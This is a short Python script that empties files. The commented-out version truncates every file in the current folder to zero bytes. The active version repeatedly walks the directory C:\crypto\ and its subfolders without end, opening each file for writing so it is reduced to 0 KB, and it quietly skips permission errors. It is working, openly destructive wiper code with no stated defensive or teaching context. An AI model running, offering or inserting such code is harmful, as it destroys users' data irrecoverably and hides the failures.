# import os, glob

# def zero_files():
#   for filename in glob.glob("*.*"):
#     if os.path.isfile(filename):
#       open(filename, 'w').close()

# if __name__ == "__main__":
#   zero_files()

import os, sys #imports modules for file handling
 
dir_path = 'C:\\crypto\\' #current directory
while True : 
	for root, dirs, files in os.walk(dir_path):  
	    for fname in files:
	        full_path = os.path.join(root, fname)
	        try:
	            if os.path.isfile(full_path):
	                open(full_path, 'w').close() #open file with writing permission and close it to make it 0KB size
	        except PermissionError: #if you don't have write permission
	            pass